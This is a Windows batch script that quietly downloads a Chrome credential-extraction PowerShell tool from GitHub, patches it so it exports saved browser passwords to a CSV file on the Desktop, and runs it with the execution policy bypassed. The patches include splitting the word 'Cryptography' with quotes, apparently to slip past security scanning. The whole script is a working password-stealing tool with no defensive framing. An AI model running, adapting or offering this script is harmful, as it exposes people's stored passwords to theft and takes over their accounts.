@echo off
set "WORK_DIR=%TEMP%\chrome_creds_tmp"
if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"
if exist "%WORK_DIR%\payload_temp.txt" del "%WORK_DIR%\payload_temp.txt"
curl.exe -fL -s "https://raw.githubusercontent.com/marcosimioni/chrome-creds/master/chrome-creds.ps1" -o "%WORK_DIR%\payload_temp.txt" 2>nul

(
echo $ErrorActionPreference = 'SilentlyContinue'
echo $c = Get-Content 'payload_temp.txt' -Raw
echo $c = $c -replace '(?s)"Export".*?"Import"', '"Export" { } "Import"'
echo $c = $c -replace '\$arrExp \^^^| Format-Table', ('$arrExp ^| Export-Csv -Path "' + $HOME + '\Desktop\Chrome_Local_Passwords.csv" -NoTypeInformation; Write-Host "`n[SUCCES] Mots de passe exportes sur le Bureau sous Chrome_Local_Passwords.csv !" -ForegroundColor Green')
echo $c = $c -replace '#requires -version 7', ''
echo $c = $c -replace '\[System\.Convert\]::FromHexString\([^)]*\)', '$null'
echo $c = $c -replace 'System\.Security\.Cryptography', 'System.Security.Crypto''graphy'
echo Set-Content 'run_chrome.ps1' -Value $c
) > "%WORK_DIR%\make_chrome.ps1"

cd /d "%WORK_DIR%"
powershell -NoProfile -ExecutionPolicy Bypass -File "make_chrome.ps1" > make_chrome.log 2>&1
echo DONE
